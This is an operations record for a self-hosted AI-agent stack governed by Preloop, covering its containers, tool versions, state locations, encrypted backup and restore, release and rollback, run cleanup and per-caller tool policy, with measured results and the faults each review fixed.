# Operations — what is actually running, and what must survive

Scope: keeping the environment in use, and being able to undo a change. Full unattended
installation from nothing is covered as of §25.

Measured 2026-09-23 on the running stack. Everything below was read from the live host and
containers, not from the compose files.

## 1. Revisions actually in use

| what | value |
|---|---|
| this tree (`D:\Work\poc-278`, mounted as `/work`) — the repository, and what runs | `main` of `astro3141/agent-stack` |
| research workspace (`D:\Work\research-280`, mounted as `/research`) | not a git tree; 49 MB of data |
| the repository this work came from | no longer part of what runs here: it keeps the issue this became, the history up to the split, and the composition work under `poc/278-composition/` |

**This tree is the repository** (`astro3141/agent-stack`, private), and that is a change: the
measurements used to be made here and mirrored into that repository under `poc/281-routing/`. Two trees
produced exactly one class of bug, and review found it rather than we did: `novel_reviews.py`
was published calling `fanout.run_all(..., ledger=…)` against a `run_all(jobs)`
published without that parameter, so the copy that ran was the other one and "measured on the
running stack" described code no reader could execute. A mirror check was written, then widened
twice as it kept finding what it did not compare (fixtures and policy; deletions; the root
documents). None of that is needed now: there is one tree, and it is the one that runs.

What the move did **not** carry: the composition's own history, which stays in that repository under
`poc/278-composition/`. This history starts at `9cce003`, the snapshot taken when that work ended.

One difference from the published copy survived the move and is worth keeping in mind:

| file | this tree (running) | the copy in the earlier repository's history |
|---|---|---|
| `docker/agent.Dockerfile` | unpinned installs; copies one host CA file | Claude 2.1.278, Conductor `87f7788e`, Preloop CLI 0.15.0 pinned; `ca/` directory, certificates unversioned |

So **the running agent image was built from the unpinned Dockerfile**, and the versions in it are
whatever the installers returned on 2026-09-22 (§3). The pinned Dockerfile in the repository has
never been built here. The compose defaults are the repository's relative ones on both sides;
what differs is this host's `docker/.env`, which is where a host's own paths belong.

### What the platform provides, and what a workflow decides

`CONTRACT.md` draws that line: the platform provides capabilities with guarantees, the workflow
decides behaviour. It carries the audit of where this PoC had crossed it — the fan-out each
workflow had re-implemented (now `stack/steps/tasks.py`), the "required review" judgement that sat
inside it, the trading baseline computed in a platform step, and `record.py` accepting only one
execution per run (now a parent run with a child run per execution, so a lane's own tokens and
duration can be compared).

### Compositions: running with less, and knowing what that costs

Memory pressure was being answered by stopping containers by hand, which left no record of what
had been switched off. It is a choice the stack now offers, with the consequence stated:

```
scripts/up.sh --composition full        everything (default)
scripts/up.sh --composition no-record   without MLflow
scripts/up.sh --composition runtime     without MLflow and without the screen
```

Measured on this host (`docker stats`, no run in flight):

| | containers | memory |
|---|---|---|
| before this change | 16 | 3,908 MiB |
| `full` | 16 | 2,239 MiB |
| `no-record` | 15 | 1,753 MiB |
| `runtime` | 13 | 1,728 MiB |

**Most of the saving is not in dropping services.** MLflow 3.16.1 starts a fleet of job consumers
(measured: 18 processes, huey workers 10+10+5+2+10+5) for work this stack never submits; it was
2,157 MiB, the largest container by far — more than all eight Preloop containers together.
`MLFLOW_SERVER_ENABLE_JOB_EXECUTION=false`, `MLFLOW_SERVER_JOB_ENABLE_PERIODIC_TASKS=false` and
`--workers 1` bring it to 387 MiB with logging, artifacts and existing runs unaffected. Dropping
the screen, which looked like the obvious saving before it was measured, is worth 25 MiB.

**What may never be dropped**: Preloop (tool rights and approvals), the egress allowlist proxy,
the file tool server, the quota observer. A stack without those is not a smaller stack, it is one
that cannot say what an agent was allowed to do — so no composition offers it, and a control
fails if a service is ever marked optional.

**What a composition changes for a run.** `stack/capabilities.py` probes the services themselves
(a declared composition can be stale, a probe cannot) and `run_workflow.py` refuses a run whose
capabilities are missing. Recording is the one a run can do without, and only when the caller
says so: `--allow-unrecorded` on the CLI, `"allow_unrecorded": true` on `POST /api/runs`. The run
then records that it started unrecorded, and which capabilities the stack had at that moment.

Measured: in `no-record`, a start is refused with *"the stack cannot run this now: record"*; with
the opt-in the same cycle ran to 3/3 valid lanes and its `record_error` names the unreachable
MLflow instead of the run pretending to have been recorded.

## 2. Containers and images

| container | image | image id | restart |
|---|---|---|---|
| agentstack-agent | agentstack/governed-runtime:local | `3e8bd6e7acaf` | unless-stopped |
| agentstack-quota | agentstack/governed-runtime:local | `3e8bd6e7acaf` | unless-stopped |
| agentstack-mlflow | agentstack/mlflow:3.16.1 | `57a342f2b725` | unless-stopped |
| agentstack-toolsvc | agentstack/toolsvc:local | `38b87dca3845` | unless-stopped |
| agentstack-fsmcp | agentstack/fsmcp:local | `f57433a16a90` | unless-stopped |
| agentstack-egress | agentstack/egress:local | `c458342cf3e7` | unless-stopped |
| agentstack-ops | agentstack/ops:local | `9e0c9a20f6f6` | unless-stopped |
| agentstack-hub | agentstack/hub:local | `5242dbd198af` | unless-stopped |
| preloop-oss api / worker / flow-worker / scheduler / gateway | ghcr.io/preloop/preloop:0.15.0 | `82728945c4b6` | unless-stopped |
| preloop-oss console | ghcr.io/preloop/console:0.15.0 | `d53da2640ace` | unless-stopped |
| preloop-oss postgres | pgvector/pgvector:pg16 | `ccc6e83d6e35` | unless-stopped |
| preloop-oss nats | nats:alpine | `ac8f88a6494b` | unless-stopped |

The `:local` tags are mutable: a rebuild replaces them and the previous image keeps no tag. There
is no release history to go back to.

## 3. Tool versions — and where they live

Read inside `agentstack-agent`:

| tool | path | version in use | same path inside the image |
|---|---|---|---|
| claude | `/home/agent/.local/bin/claude` | 2.1.278 | 2.1.278 |
| conductor | `/home/agent/.local/bin/conductor` | v0.1.37 | v0.1.37 |
| preloop CLI | `/home/agent/.local/bin/preloop` | 0.15.0 (`c91b326`) | 0.15.0 |
| codex | `/opt/npm-global/bin/codex` | codex-cli 0.155.1 | 0.155.1 |
| grok | `/opt/npm-global/bin/grok` | 1.0.40 | 1.0.40 |
| node / python | image | v22.14.0 / 3.13.15 | — |
| acpx, claude-agent-acp, codex-acp | `/opt/npm-global` | 0.18.0, 0.79.0, 1.12.0 | same |

**`/home/agent` is a volume (`agentstack-agent-home`), and it masks the image's copy of that
directory.** Claude, Conductor and the Preloop CLI are installed there. Today the two copies agree,
but nothing keeps them in step: after a rebuild the container still runs the volume's binaries, and
after `claude update` inside the container the image's copy is stale. Consequences:

- **Replacing the image does not roll back those three tools.**
- A release must therefore be recorded as *code revision + image ids + configuration + the tool
  versions read from the running container* (this table), not as an image tag alone.

## 4. Where state lives, and what it costs to lose

| data | location | size | class | why |
|---|---|---|---|---|
| provider logins (Claude, Codex, Grok) + Codex session ledger | volume `agentstack-route-creds` → `/route` | 66 MB | **restore required** | only the operator can recreate them, interactively, per provider |
| Preloop agent enrolment, CLI config, the agent's own `~/.codex`, `~/.claude` | volume `agentstack-agent-home` → `/home/agent` | 771 MB | **restore required** | enrolment token and client id; re-enrolling is a manual Preloop operation |
| observer's Codex login (+ caches) | volume `agentstack-quota-home` → `/home/agent` (quota) | 1.3 GB | **restore required** (login part) | operator login; the caches inside are disposable |
| Preloop account, policies, MCP servers, approval history, custodied credentials | volume `preloop-oss_postgres-data` | 22 MB | **restore required** | registration closes after the first user; re-creating it is a manual bootstrap |
| Preloop secrets/config | `~/.preloop-oss/.env` (21 lines) | 1 KB | **restore required** | the database is bound to these keys; without it a restored DB is not usable |
| research data | bind `D:\Work\research-280` → `/research` | 49 MB | **restore required** | the actual subject of the #280 work |
| MLflow database and artifacts | bind `evidence/mlflow` → `/mlflow` | 12 MB | **restore required** | the record of every run; SQLite file and artifacts must be kept together |
| run evidence: `evidence/ui-runs`, `evidence/p281`, `evidence/runs`, `evidence/conductor-events` | workspace | 3 MB | **restore required** | a run's UI record, its Conductor event log and its artifacts are one unit — they are kept or dropped together |
| settings sources: `config/environment.yaml`, `config/profiles/*`, `policy/*` | workspace (versioned) | small | **restore required** if edited locally | the repository holds them, but operator edits live here first |
| apply state `config/generated/state.json` | workspace (git-ignored) | small | **special** | derived in form, but it records which policy this tool made active on the account. It pairs with the Preloop database: restore both from the same snapshot, or reset it and apply again. Never restore it against a different Preloop database |
| generated settings `config/generated/*.json` | workspace | small | regenerate | `cfg.py generate` |
| quota observations | volume `agentstack-quota-obs` → `/obs` | 12 KB | regenerate | the observer rewrites them within minutes |
| per-run workspaces | volume `agentstack-ws` → `/ws` | 700 KB | regenerate / discard | scratch for a run; keep only while the run is open |
| images | Docker | — | rebuild | but see §3: a rebuild does not restore tool versions held in the volume |
| host CA file `docker/ca/*.crt` | workspace | 1 KB | site-specific | needed on this host (TLS interception); deliberately unversioned |

Docker keeps all volumes in one WSL2 disk: `%LOCALAPPDATA%\Docker\wsl\disk\docker_data.vhdx`
(36 GB). A copy of the whole disk is a crude but complete backup of every volume at once; a copy
taken on 2026-09-23 sits in `D:\docker-vhdx-backup-20260923`.

## 5. Host facts and failure modes

- Windows 11 + Docker Desktop 29.8.0 (WSL2 backend). Everything here depends on that combination.
- **Docker Desktop can fail to start with a stale socket file**, e.g.
  `initializing Ingest server … sailor-ingest.sock … The file cannot be accessed by the system`.
  The files under `%LOCALAPPDATA%\Docker\run` and `%LOCALAPPDATA%\docker-secrets-engine` are AF_UNIX
  sockets that Windows then refuses to open, rename or delete; each failed start leaves more of
  them. Docker has open reports of this
  ([#676](https://github.com/docker/desktop-feedback/issues/676),
  [#554](https://github.com/docker/desktop-feedback/issues/554),
  [#460](https://github.com/docker/desktop-feedback/issues/460)).
  - **Do not press "Reset to factory defaults" in that dialog. Press Quit.** The reset deletes
    images, containers and volumes — that is every login, the Preloop database and all run history
    in §4.
  - Recovery that worked (2026-09-23): quit Docker Desktop, move both directories aside, and if it
    still fails, **restart Windows** — that cleared them and the engine came up in ~10 s. Measured:
    no data was lost, all 16 checks passed, the three provider logins survived.
- After a host restart both compose projects come back on their own (`restart: unless-stopped`);
  `scripts/up.sh --check` confirms.

## 6. Scope now

1. **Backup and restore** — a consistent backup, restored onto new volumes and a fresh clone,
   verified by authentication, policy, records and a small task, with the live instance untouched.
2. **Update and rollback** — keep the previous release (code + images + configuration + the tool
   versions of §3) and perform an update and an operator-run rollback.
3. **Maintenance** — cleanup that previews by default and never splits a run from its records;
   checks that show when they last ran and why they failed.
4. **Full fresh installation** — deferred. What is manual today stays written down instead
   (`docs/record/RUNBOOK-278.md`, #278 §2.1–2.6 plus the #281 bring-up and the operator logins).

## 7. Backup and restore (measured 2026-09-23)

```bash
scripts/backup.sh [--out DIR] [--key FILE]     # stops the writers, copies, encrypts
scripts/restore.sh --archive FILE --workspace DIR --clone-from REPO --rev REV --stack NAME
scripts/restore.sh --archive FILE --workspace X --verify-only    # decrypt + manifest only
```

**What a backup holds** — everything marked *restore required* in §4: the three volumes
(`route-creds`, `agent-home`, `quota-home`), a transactional dump of Preloop's database, and the
host paths `evidence/mlflow`, `evidence/p281`, `evidence/ui-runs`, `evidence/runs`,
`evidence/conductor-events`, `config/` (including `generated/state.json`, taken with the database
so the two agree), `policy/`, the research data and the Preloop install directory with its `.env`.
`quota-obs` and `ws` are left out: they are regenerated. A `release.json` records the revision,
image ids and the tool versions read from the running containers (§3).

**Consistency.** Every writer is stopped for the copy (15 containers, ~2 minutes); Postgres stays
up for its dump alone. `--no-stop` exists for a dry run and is crash-consistent only.

**Encryption.** The archive holds provider logins, the Preloop enrolment token and Preloop's key
file, so it is always AES-256 encrypted with a key file kept outside the archive
(`~/.cadp-backup.key`, created on first use). **Lose the key and the backup is unreadable — keep a
copy of the key, and of the archive, on separate media.** Nothing is written inside the workspace
or the repository.

**Restoring never touches the instance in use.** The restored copy gets its own instance name
(`STACK`, default `agentstackr`), its own volumes, its own Preloop project and its own ports (hub
8790, ops 8791, MLflow 5010, Preloop 8010/8011/3010). Both copies hold the *same* credentials, so
they must not run at once: the script refuses to start while the live instance is up, and prints
how to stop it.

**Result of the first real exercise** (backup `20260922-234312`, 1.1 GB, 14 members):

| criterion | result |
|---|---|
| archive readable and unchanged | 14/14 members match their SHA-256 |
| restored into a fresh clone (`poc/281-ops`), new volumes, new ports | instance `agentstackr` came up; live volumes and workspace untouched |
| authentication | all three provider logins usable without logging in again; observer login too |
| policy | `cfg.py status` → `applied`; Preloop MCP still requires authentication; fsmcp tools exposed |
| records | the run history and the MLflow experiments from the backup were there |
| a small task | `auto` workflow → **PASS** (`file present with expected content`) |
| all checks | 16/16 |

**Three faults the exercise found — all fixed:**

1. **A Windows clone broke the observer.** Git checked the shell scripts out with CRLF; `/bin/sh`
   inside the container then failed (`Syntax error: end of file unexpected`). Fixed by
   `.gitattributes` (`* text=auto eol=lf`).
2. **A clone without instance names silently started the live instance** against the restored
   workspace. The restore script now refuses a revision that has no `STACK` support, and checks
   after start-up that the containers carry its own name.
3. **The Preloop policy addressed the tool servers by instance-specific host names**
   (`agentstack-toolsvc`, `agentstack-fsmcp`), so in the restored copy the model could not reach them and
   the task ended `BLOCK`. The services now carry the instance-independent aliases `toolsvc` and
   `fsmcp`, and every policy file uses those. Re-applied and verified on both instances (live task:
   PASS).
   MLflow's allowed-host list also had the port fixed at 5000; it now follows the instance's port.

**Not covered.** Expired or revoked credentials are not made to work again by a restore: what is
restored is the state as it was. A restore proves the state comes back, not that a token is still
valid.

### Review of the first exercise — what was wrong, and what it does now (2026-09-23)

A review of the scripts at `f295884` found six failure paths. All are fixed and each was exercised
against the running stack.

| # | was | is now | checked |
|---|---|---|---|
| 1 | the teardown command printed after a restore carried no instance name, so in a new shell it resolved to the live project | the restore writes `config/instance.env` (instance name, Preloop project, paths, ports) and `docker/.env`; `up.sh` and the new `down.sh` in that workspace read it | in the restored workspace, `up.sh --check` used ports 8791/8790 and `down.sh --volumes` removed only `agentstackr-*` and `preloop-restore_*`; the six live volumes were untouched |
| 2 | an existing workspace could be overwritten, and a stray `PRELOOP_PROJECT` could point the `DROP DATABASE` at the live database | every target — workspace, Preloop project and install directory, volumes, container names — is checked **before the first write**; the live instance's own mounts are compared against the target both ways | refused: the live workspace (with and without `--into-existing`), the live Preloop project, the live Preloop directory, the live stack name, an existing clone target, a missing workspace. Nothing was unpacked in any of them |
| 3 | `pg_restore … \|\| true` discarded errors and the restore continued on a table count | `--exit-on-error`, the output kept, and the row counts of `account`, `user`, `api_key`, `mcp_server` and `approval_request` must match the numbers recorded in the backup | a truncated dump: `pg_restore: error: could not read from input file: end of file` → stopped, **no containers started**. A good archive: "80 tables, key counts match" |
| 4 | the backup copied from wherever the script happened to live, and a missing source was just "skipped" | sources come from the running containers' mounts (`/work`, `/research`, `/mlflow`, normalised from Docker's internal form), and a missing **required** member fails the run (`--allow-missing` to override) | with `evidence/mlflow` moved aside: `backup failed: required members missing: mlflow`, and the staging directory removed |
| 5 | a failure after the database dump left plaintext behind | staging is created `umask 077`/`chmod 700` and removed on every exit path, and the containers are started again from the same handler | after the induced failure: no staging directory left |
| 6 | `release.json` was assembled by string concatenation and did not parse | it is written and re-read by a JSON library, and the release must be complete: tool versions and database counts are required members | parsed; `{"claude": "2.1.278 …", "codex": "codex-cli 0.155.1", …}` and `{"account": 1, "user": 1, "api_key": 6, "mcp_server": 2, "approval_request": 44}`. The tool versions are read from the container, which is started for the reading if it was stopped |

**One more trap, found while re-testing.** A clone whose `up.sh` predates `instance.env` started the
**live-named** containers against the restored workspace (it happened, and was reverted with no data
loss: the live containers were recreated from the live workspace and all checks passed). The restore
now refuses a revision whose `compose.poc.yaml`, `up.sh` or `down.sh` lacks instance support, before
anything is started, and still verifies the names afterwards.

**Second exercise, end to end** (archive `20260923-004642`): restored into a fresh clone →
`agentstackr` on its own ports → 16/16 checks → Preloop counts match → run history and MLflow
experiments present → `auto` workflow **PASS** → `down.sh --volumes` removed only the restored
instance → the live instance came back with 16/16 checks.

### Second review — four failure paths closed (2026-09-23)

| # | was | is now | checked |
|---|---|---|---|
| 1 | the restore compared its Preloop directory with the live one for equality only, and split the live mount list on spaces, so a parent directory of the live install (later `rm -rf`'d) and a path with spaces slipped through | every directory the restore writes to or deletes — its workspace and its Preloop install — is compared **both ways** against every directory the live instance uses, on normalised paths, read line by line. Docker's internal mount form (`/run/desktop/mnt/host/d/…`) is normalised first; unnormalised it matched nothing and the check passed silently | refused: workspace equal to, inside, or containing the live workspace; workspace equal to the live research directory; Preloop directory equal to, above, or inside a live directory; the restore's own two directories overlapping each other; and the same with spaces in the path. A separate target still passes |
| 2 | `down.sh --volumes` selected by name prefix, so with `STACK=agentstackr` a volume named `agentstackr-second-…` was selected too | the five volumes of the instance and its Preloop data volume are named exactly | with `agentstackr-second-route-creds` and `agentstackr-second-agent-home` present, only `agentstackr-route-creds` was removed; the lookalikes survived |
| 3 | `up.sh` defaulted `POC_HOST_DIR`/`RESEARCH_HOST_DIR` to its own directory and exported them, and a shell variable wins over `docker/.env` — so the live agent had ended up mounting the wrong research directory | no path is defaulted in `up.sh`/`down.sh`; one is exported only when the environment or a restored workspace's `instance.env` set it. Compose then reads `docker/.env`, and falls back to the relative defaults | after the fix the live agent mounts `D:/Work/research-280` again (it had been mounting `…/poc-278/evidence/research`), and the restored copy mounts its own |
| 4 | the row counts were read before the writers were stopped and the dump taken after, so an approval arriving in between made a good dump look wrong | the counts are read after the stop and immediately before `pg_dump`, from the same quiesced state | a fresh backup and restore: "80 tables, key counts match" |

Third exercise, end to end (archive `20260923-011845`): fresh clone → `agentstackr` on its own ports →
16/16 checks → counts match → `auto` workflow **PASS** → the research data restored (48 MB of the
49 MB directory, the difference being files the backup excludes) → `down.sh --volumes` removed only
this instance's six volumes → the live instance came back with 16/16 checks and its correct mounts.

## 8. Update and rollback (measured 2026-09-23)

```bash
scripts/release.sh record [--tag NAME]         # keep what is running now
scripts/release.sh list
scripts/release.sh update --to REV             # record, move the workspace to REV, rebuild, check
scripts/release.sh rollback --to TAG           # put a kept release back (the operator runs this)
```

**A release is not an image tag.** Because Claude, Conductor and the Preloop CLI live in the
`agent-home` volume that masks the image's copy (§3), replacing the image does not change what
runs. A release here is therefore four things, kept together:

| part | how it is kept |
|---|---|
| code revision | the workspace's git revision (an update and a rollback check it out) |
| images | each running image is tagged `…:rel-<tag>`, so a later build of `:local` cannot take it away |
| configuration | `config/`, `policy/` and `docker/.env` |
| the toolchain itself | `/home/agent/.local` from the volume — 256 MB compressed |

**Data is not part of a release.** Logins, the Preloop database, MLflow and the run history stay
where they are and must survive both directions. `scripts/backup.sh` is what covers them.

Only changes to **tracked** files block an update or a rollback; run evidence living in the
workspace is untracked data and is not a reason to refuse. After either command the workspace sits
on that revision (detached); check out a branch again to continue development.

**Exercise.**

| step | result |
|---|---|
| `record --tag base` | 7 images tagged `rel-base`, toolchain 256 MB, configuration 8 KB, six tool versions read from the container |
| `update --to <rev>` (a visible change in the hub) | the release in use was recorded first, images rebuilt, stack recreated, **16/16 checks** |
| after the update | the hub showed the new version; **logins, policy state (`applied`), the run history (8 runs) and the MLflow experiments were unchanged** |
| a change made only inside the volume | a file added under `/home/agent/.local/bin` — the case an image rollback would not undo |
| `rollback --to base` (operator-run) | workspace back at its revision, `…:local` re-tagged from `rel-base`, **the volume's toolchain put back (the added file was gone)**, configuration restored, **16/16 checks** |
| after the rollback | the hub showed the old version again; policy, runs and MLflow unchanged; `auto` workflow **PASS** |

Automatic rollback on a failed update is deliberately not included: the update prints the command
and the operator decides. A database migration that changes Preloop's schema is not covered by
image rollback either — that would need a restore from a backup taken before the update.

### Review of the release path — five points closed (2026-09-23)

| # | was | is now | checked |
|---|---|---|---|
| 1 | the release carried `config/generated/state.json`, so a rollback claimed a policy the account did not have (A kept → B applied → back to A left the account on B, reported `applied`) | generated settings are not part of a release; after an update or a rollback the restored policy is **applied again** and the resulting state is printed | kept `polA` (policy `b-fsmcp`) → switched the profiles to a variant and applied it (account: variant) → rolled back: the account is on `b-fsmcp` again, `state: applied`, `active_on_account: policy/b-fsmcp.yaml` |
| 2 | the rollback deleted `/home/agent/.local` and then unpacked; a damaged archive left the agent with no toolchain | images, both archives and the unpacked toolchain are verified **before** anything changes, and the running one is swapped only for a staged copy that looks usable | a truncated toolchain archive: "the release's archives do not verify — nothing was changed", and Claude and Conductor still ran |
| 3 | the revision and configuration were read from wherever the script sat, the images from the running containers — they could describe different checkouts | every command first checks that this workspace is the one the agent mounts as `/work` (Docker's internal mount form normalised) | running `record` from the repository checkout: "this script is in … but agentstack-agent runs D:/Work/poc-278" |
| 4 | an update rebuilt images but left the volume's toolchain in place, so a Dockerfile version bump changed nothing | the update compares the running tool versions with the new image's and **refuses** when they differ, unless `--replace-toolchain` is given, which stages the image's `/home/agent/.local` and swaps it in | with a deliberately different version in the volume the update refused and named the difference; with `--replace-toolchain` it replaced the toolchain and the intended version ran |
| 5 | `record` accepted uncommitted changes to tracked files while keeping only the revision | `record` refuses them too (untracked run evidence is still fine) | refused with an edited tracked file |

After these, a release is: revision + images + configuration **sources** + the toolchain, with the
Preloop policy applied again on both paths. Data (logins, database, MLflow, run history) still
belongs to `backup.sh`, not to a release.

### Second review of the release path — four boundaries closed (2026-09-23)

| # | was | is now | checked |
|---|---|---|---|
| 1 | a policy that could not be applied was ignored (`|| true`), so an update ended "done" with the account still on the previous policy | an unapplied policy fails the update, with the rollback command | with `preloop policy apply` made to fail and a policy that really had to be applied: `"apply failed"`, "the update left the Preloop policy unapplied", exit 1 |
| 2 | the toolchain comparison happened after the workspace and images had already moved, so a refusal left a mixed state | the target revision is built in a throw-away worktree under its own tag and compared there; the workspace, the `:local` tags and the containers are touched only after that passes | refused with the workspace at its revision, the agent image id unchanged, and no release recorded |
| 3 | a valid tar with no real tools passed (only the link's presence was checked) and the swap then removed the running toolchain | the staged copy is followed *inside itself* — every required tool must exist and be non-empty — and the previous copy is kept until the new one answers | an archive whose `bin/claude` pointed at a missing target and whose `share/claude` was empty: "the release's toolchain has no usable tools in it — the running one is untouched"; Claude, Conductor and the Preloop CLI still answered |
| 4 | restoring a release recorded by the older script brought its `config/generated/state.json` back, so the re-apply was skipped as "already applied" | generated settings are excluded on extraction as well, and a new record carries `format=2` | rolling back to the old-format `base`: configuration restored without generated settings, policy **applied** (not "already"), `active_on_account` correct |

The candidate build also showed why this matters: the workspace's `agent.Dockerfile` was unpinned,
so a rebuild fetched Claude 2.1.280, Conductor 0.1.39 and Preloop CLI 0.16.0 against a stack running
2.1.278 / 0.1.37 / 0.15.0. The versions in use are now pinned there as well (they already were in
the repository copy).

Two smaller faults came out of the same run and are fixed: a tool that cannot answer no longer
aborts the script, and the candidate build takes a native path for its context.

### Third review of the release path — three boundaries closed (2026-09-23)

| # | was | is now | checked |
|---|---|---|---|
| 1 | the toolchain was judged only after the checks and the policy had passed, so a replacement that installed but could not run was left in place | the swapped-in toolchain is judged immediately after the stack comes back, whatever the checks said; a copy that does not answer is put back and the command fails | a release whose Claude was present and non-empty but not executable: "the new toolchain does not answer (claude) — putting the previous one back", exit 1, and the working tools answered again |
| 2 | a refused toolchain left the agent stopped, because it was stopped before verification | staging and verification happen while the agent runs; only the swap stops it | the hollow-archive refusal now ends with the agent still `running` and Claude answering |
| 3 | the candidate build looked for `docker/agent.Dockerfile` at the worktree root, which is wrong wherever this stack sits below the repository root (the restored copies from §7 do) | the candidate uses the same prefix this workspace has inside its own repository (`git rev-parse --show-prefix`) and says so if the file is not there | the prefix is empty in the PoC workspace and `poc/281-routing/` in a repository checkout; a worktree of this repository resolves `poc/281-routing/docker/agent.Dockerfile` |

**One more, found while testing.** An update or a rollback checks out another revision of the very
workspace this script lives in — including the script. A shell reads a script as it runs, so the
file changed underneath it. `release.sh` now copies itself to a temporary file and re-executes that
copy, so the running code cannot change halfway.

## 9. Cleanup and check reporting (measured 2026-09-23)

```bash
scripts/cleanup.sh [--days N] [--keep N] [--apply] [--include-orphans] [--json]
scripts/up.sh --check        # also writes evidence/checks/last.json
```

**Cleanup removes runs, not directories.** A run leaves three traces — the screen's record
(`evidence/ui-runs/<id>/`, with Conductor's event log), the workspace it worked in
(`<workspace_root>/<run>…`) and the adapter's evidence (`evidence/p281/<run>-…`). They are grouped
by the Conductor run id and removed together or not at all, so the screen never lists a run whose
artifacts are gone.

**Preview is the default.** Nothing is deleted without `--apply`.

**A run is kept, whatever its age, when** it is still running; Preloop has a pending approval under
its workspace; the operator marked it (a `keep` file in its directory); or it is inside the
retention window (`--days`, default 14) or among the newest (`--keep`, default 20). Traces that
belong to no run on the screen are reported as orphans and are only removed with
`--include-orphans`.

Run times come from the run id, not from file timestamps — a restored or copied file carries the
wrong date.

**Checks now leave a record.** `scripts/up.sh --check` writes `evidence/checks/last.json` with the
time, the instance, whether it passed and each failing check with what was expected and what was
found. `ops` serves it at `/api/checks`, and the hub shows one line in the header:

- `점검 통과 · 3분 전` — passed, and how long ago;
- `점검 통과 · 2일 전 (오래됨)` — passed, but the last check is over a day old;
- `점검 실패 · 3일 전 · grok /route login: yes 기대, no; MLflow: 200 기대, 000` — what failed.

That is the only screen addition in this step.

**What the exercise found**

| case | result |
|---|---|
| preview by default | with no `--apply`, nothing was deleted and the grouped list was printed |
| a run marked `keep` | kept under `--days 0 --keep 0` ("marked keep") |
| a run still going | kept ("still running") |
| a pending approval under a run's workspace | kept ("an approval is pending under its workspace") |
| **the approvals reader failing** | **the first version deleted anyway** — the reader's non-zero exit produced an empty list. It now stops with "nothing was removed", for a failed reader and for unreadable output alike |
| check reporting | passing, stale and failing states all shown on the screen, with the failing checks named |

The bad case above was found by running it: 15 old runs were removed while the approvals reader was
broken. Everything tracked in git came back with `git checkout`, and the 11 untracked evidence
directories were restored from the backup taken earlier (§7) — which is the first time a backup was
used for its actual purpose here.

### Review of the cleanup — four boundaries closed (2026-09-23)

| # | was | is now | checked |
|---|---|---|---|
| 1 | the approvals reader asked for the first 50 requests of the whole history, so fifty decided ones hid a waiting one and its run was removed | it asks for `status=pending` and keeps asking until a page comes back short; `--all` reports whether the answer is **complete**, and the cleanup stops unless it is | a reader reporting `complete: false` stops the run with "nothing was removed"; a pending request that only a full scan reaches protects its run and its orphan traces |
| 2 | orphans were collected separately and deleted straight away, with none of the protections | orphans are held to the same rules: a pending approval under them, a recent change, or **any** run whose state could not be read keeps them | each case exercised; an unreadable `meta.json` alone is enough to keep every orphan |
| 3 | `ignore_errors=True` meant a group could half-disappear and still be reported as removed | every path of a group is moved aside first; if one move fails the others are put back and the run is reported as **failed**, not removed (exit code 1) | with a move made to fail, nothing of that run was gone and it was listed under "could NOT be removed" |
| 4 | a run was judged by the state on the screen, so one whose launcher was still writing its final state could be removed | the launcher process is checked directly, whatever the log and the state say | a run with an end in its event log but a live launcher is kept ("its launcher is still alive") |

These are covered by `stack/cleanup_controls.py` (13 checks), which runs against temporary
directories with a stubbed approvals reader — no run of the instance is read or removed.

**Cost of testing this badly — what was and was not recovered.**

Two of these cases were first exercised against the live workspace with `--apply`, which removed
real run evidence. The recovery was **partial**:

| trace | result |
|---|---|
| the screen's records (`evidence/ui-runs/`), tracked in git | fully recovered with `git checkout` |
| adapter evidence (`evidence/p281/`), not tracked | 36 directories restored from the backup, in two goes. Four runs are still without it, because they ran after that backup was taken: `20260923-014530-00808d` (5775abd7), `20260923-014953-0b2b01` (405095d1), `20260923-022134-3ccc7a` (7933931d), `20260923-030330-8b15a3` (da721b3f) |
| the scratch workspaces under `/ws` | **not recovered, for any of the twelve runs**: 7f7e0fa0, 552e1957, d9f651cc, c5ece803, e13fe17b, 7ed5fc4f, 189cd1a8, 38a59361, 5775abd7, 405095d1, 7933931d, da721b3f. They are classified regenerate/discard in §4 and are deliberately not in the backup |

The 16/16 checks reported after the incident say the services are healthy. They are not evidence
that past artifacts came back; the table above is. The controls exist so that these paths are
never exercised on live data again.

### Two more boundaries in the cleanup (2026-09-23)

| was | is now | checked |
|---|---|---|
| an orphan was protected path by path, so a pending approval on `/ws/<run>-execute` still let `evidence/p281/<run>-execute-codex` be deleted | orphan traces are grouped by run id as well: protections and removal apply to the whole run | an approval on one trace keeps both; an unprotected orphan run goes with all of its traces |
| `shutil.move` falls back to copy-then-delete, so a failure in the middle could leave the original partly gone while a copy sat in the holding place | the holding place is on the same mount by construction, so `os.rename` is used and nothing is copied; a rename that cannot be done is a failure to report | with a rename made to fail, every path of the run stayed where it was and the holding place was left empty |

`stack/cleanup_controls.py` now covers 17 cases.

## 10. Tool policy per caller — corrected and measured (2026-09-23)

An earlier version of this section concluded that a per-role permission "cannot be expressed in
this version". **That was wrong**, and the review that caught it was right: the conclusion came
from reading the condition evaluator alone and stopping there.

**What is true about conditions.** A rule's CEL expression is evaluated against `{"args": args}`
only; the caller is not visible *inside the expression*.

**What that misses.** Choosing *whose* rules apply happens before the expression is evaluated.
Read in the running image (`ghcr.io/preloop/preloop:0.15.0`):

| mechanism | where |
|---|---|
| `subject_scope_chain()` — the caller's `api_key_id`, then its `managed_agent_id` | `services/subject_governance.py` |
| `get_scoped_tool_rules()` — the rules for that subject, most specific first | same |
| `is_tool_enabled_for_subject()` — a per-subject on/off for a tool, checked **before** any rule | same |
| both are called by the policy evaluator, which is handed `subject_context` | `services/policy_evaluator.py` |
| the MCP proxy fills that context on every call and also filters the tool **list** per subject | `services/dynamic_fastmcp.py` |
| per-key governance is readable and writable over the API | `GET/PUT /api/v1/auth/api-keys/{id}/governance` |

**Two of the three providers are different subjects; the third is not.** Codex and Claude were each
enrolled as their own managed agent, and the account holds a credential for each, with different
`api_key_id` *and* `managed_agent_id` (read from the API). **Grok presents Claude's credential**:
comparing the bearer token each provider sends to the Preloop MCP endpoint (hashes only, never the
values) gives

| provider | MCP credential |
|---|---|
| Claude | `57dfc1f6…` — the same token the adapter uses for permission checks |
| Grok | `57dfc1f6…` — **the same one** |
| Codex | `5f90701f…` — its own |

So a per-credential rule aimed at Claude would hit Grok as well. That is a fact about this
installation, not about Preloop: Grok's Preloop registration was never separate here (see
`run-agent.mjs`, the Grok profile — it has no Preloop principal of its own, a known open item of
#281), and nothing has given it one.

**Measured end to end on the live stack**, with one policy and one account:

| step | result |
|---|---|
| `write_file` disabled on the Codex credential only (`tool_enabled_overrides`) | the governance API accepted it |
| Codex asked to write a file | **DENIED**, no file written |
